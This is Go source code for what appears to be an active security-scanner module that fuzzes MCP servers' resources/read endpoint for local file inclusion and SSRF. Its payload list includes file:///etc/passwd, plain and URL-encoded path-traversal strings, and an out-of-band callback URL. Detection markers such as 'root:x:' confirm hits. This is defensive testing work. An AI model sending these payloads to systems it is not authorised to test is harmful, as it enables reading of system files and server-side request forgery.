package mcp_resource_fuzz

import (
	"fmt"
	"regexp"
	"strings"

	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	mcpinfra "github.com/vigolium/vigolium/pkg/modules/infra/mcp"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/vigolium/vigolium/pkg/types/severity"
)

const (
	maxResources = 12
	maxTemplates = 6
)

var lfiMarkers = []string{"root:x:", ":0:0:", "/bin/", "[fonts]", "[extensions]"}

type uriPayload struct {
	value         string
	vulnTag       string
	name          string
	severity      severity.Severity
	expectMarkers []string
	oast          bool
}

type Module struct {
	modkit.BaseActiveModule
	ds dedup.Lazy[dedup.DiskSet]
}

func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeHost,
			modkit.AllInsertionPointTypes,
		),
		ds: dedup.LazyDiskSet("mcp_resource_fuzz"),
	}
	m.ModuleTags = ModuleTags
	return m
}

func (m *Module) IncludesBaseCanProcess() bool { return false }

func (m *Module) CanProcess(ctx *httpmsg.HttpRequestResponse) bool {
	if ctx == nil || ctx.Request() == nil || ctx.Response() == nil {
		return false
	}
	return mcpinfra.Detect(ctx).Strong()
}

func (m *Module) ScanPerHost(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	if ctx.Service() == nil {
		return nil, nil
	}
	host := ctx.Service().Host()
	if ds := m.ds.Get(scanCtx.DedupMgr()); ds != nil && ds.IsSeen(host) {
		return nil, nil
	}

	urlx, err := ctx.URL()
	if err != nil {
		return nil, err
	}

	client := mcpinfra.NewClient(ctx, httpClient, urlx.Path)
	if _, err := client.Initialize(); err != nil {
		return nil, nil
	}
	_ = client.SendInitializedNotification()

	resources, _ := client.ListResources()
	templates, _ := client.ListResourceTemplates()
	if (resources == nil || len(resources.Resources) == 0) && (templates == nil || len(templates.ResourceTemplates) == 0) {
		return nil, nil
	}

	payloads := buildPayloads(scanCtx, urlx.String())
	var findings []*output.ResultEvent

	// 1) resources/read on the listed URIs themselves -- mostly used as
	//    baseline source for marker subtraction.
	baselines := map[string]string{}
	for i, r := range resourceCap(resources, maxResources) {
		_, body, err := client.ReadResource(7000+i, r.URI)
		if err != nil {
			continue
		}
		baselines[r.URI] = body
	}

	// 2) Bare URI fuzzing (works against servers that read whatever URI you give)
	for i, p := range payloads {
		_, body, err := client.ReadResource(8000+i, p.value)
		if err != nil {
			continue
		}
		if p.oast {
			// OAST hits are tracked out-of-band; nothing to do here besides log
			// the attempt as evidence for the operator.
			findings = append(findings, m.makeFinding(urlx.String(), "(bare uri)", p, "request issued; check OAST log"))
			continue
		}
		if matched := matchMarkers(body, "", p.expectMarkers); matched > 0 {
			findings = append(findings, m.makeFinding(urlx.String(), p.value, p, fmt.Sprintf("%d marker(s) matched", matched)))
		}
	}

	// 3) Resource-template substitution: replace each placeholder with the
	//    payload one at a time, leaving others as benign fillers.
	tplLimit := len(templatesSlice(templates))
	if tplLimit > maxTemplates {
		tplLimit = maxTemplates
	}
	for ti, tpl := range templatesSlice(templates)[:tplLimit] {
		placeholders := extractPlaceholders(tpl.URITemplate)
		if len(placeholders) == 0 {
			continue
		}
		for pi, p := range payloads {
			for _, ph := range placeholders {
				uri := substituteTemplate(tpl.URITemplate, placeholders, ph, p.value)
				_, body, err := client.ReadResource(9000+ti*100+pi, uri)
				if err != nil {
					continue
				}
				if p.oast {
					findings = append(findings, m.makeFinding(urlx.String(), uri, p, "template request issued; check OAST log"))
					continue
				}
				baseline := baselines[tpl.URITemplate]
				if matched := matchMarkers(body, baseline, p.expectMarkers); matched > 0 {
					findings = append(findings, m.makeFinding(urlx.String(), uri, p, fmt.Sprintf("%d marker(s) matched", matched)))
				}
			}
		}
	}

	return findings, nil
}

func (m *Module) makeFinding(targetURL, uri string, p uriPayload, evidence string) *output.ResultEvent {
	return &output.ResultEvent{
		URL:              targetURL,
		Matched:          uri,
		ExtractedResults: []string{p.value},
		Info: output.Info{
			Name:        fmt.Sprintf("MCP Resource Read %s", capitalise(p.vulnTag)),
			Description: fmt.Sprintf("MCP resources/read processed payload %q on URI %q. Evidence: %s.", p.value, uri, evidence),
			Severity:    p.severity,
			Confidence:  severity.Firm,
			Tags:        []string{"mcp", p.vulnTag, "injection"},
			Reference:   []string{"https://modelcontextprotocol.io/specification/2025-11-25/server/resources"},
		},
	}
}

// helpers -------------------------------------------------------------------

func resourceCap(r *mcpinfra.ResourcesListResult, cap int) []mcpinfra.Resource {
	if r == nil {
		return nil
	}
	if len(r.Resources) <= cap {
		return r.Resources
	}
	return r.Resources[:cap]
}

func templatesSlice(t *mcpinfra.ResourceTemplatesListResult) []mcpinfra.ResourceTemplate {
	if t == nil {
		return nil
	}
	return t.ResourceTemplates
}

var placeholderRe = regexp.MustCompile(`\{([a-zA-Z0-9_]+)\}`)

func extractPlaceholders(tpl string) []string {
	matches := placeholderRe.FindAllStringSubmatch(tpl, -1)
	if len(matches) == 0 {
		return nil
	}
	out := make([]string, 0, len(matches))
	seen := map[string]struct{}{}
	for _, m := range matches {
		if _, ok := seen[m[1]]; ok {
			continue
		}
		seen[m[1]] = struct{}{}
		out = append(out, m[1])
	}
	return out
}

func substituteTemplate(tpl string, placeholders []string, target, payload string) string {
	out := tpl
	for _, ph := range placeholders {
		val := "1"
		if ph == target {
			val = payload
		}
		out = strings.ReplaceAll(out, "{"+ph+"}", val)
	}
	return out
}

func matchMarkers(body, baseline string, markers []string) int {
	if len(markers) == 0 {
		return 0
	}
	c := 0
	for _, m := range markers {
		if strings.Contains(body, m) && !strings.Contains(baseline, m) {
			c++
		}
	}
	return c
}

func buildPayloads(scanCtx *modkit.ScanContext, targetURL string) []uriPayload {
	out := []uriPayload{
		{
			name:          "file://",
			vulnTag:       "lfi",
			severity:      severity.High,
			value:         "file:///etc/passwd",
			expectMarkers: lfiMarkers[:3],
		},
		{
			name:          "Path traversal",
			vulnTag:       "lfi",
			severity:      severity.High,
			value:         "../../../../../../etc/passwd",
			expectMarkers: lfiMarkers[:3],
		},
		{
			name:          "URL encoding bypass",
			vulnTag:       "lfi",
			severity:      severity.High,
			value:         "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
			expectMarkers: lfiMarkers[:3],
		},
	}
	if oast := scanCtx.OASTProv(); oast != nil && oast.Enabled() {
		callback := oast.GenerateURL(targetURL, "uri", "mcp-resource", "mcp-resource-fuzz", "")
		if callback != "" {
			out = append(out, uriPayload{
				name:     "SSRF (OAST)",
				vulnTag:  "ssrf",
				severity: severity.High,
				value:    callback,
				oast:     true,
			})
		}
	}
	return out
}

func capitalise(s string) string {
	switch s {
	case "lfi":
		return "Local File Inclusion"
	case "ssrf":
		return "SSRF"
	default:
		if s == "" {
			return s
		}
		return strings.ToUpper(s[:1]) + s[1:]
	}
}
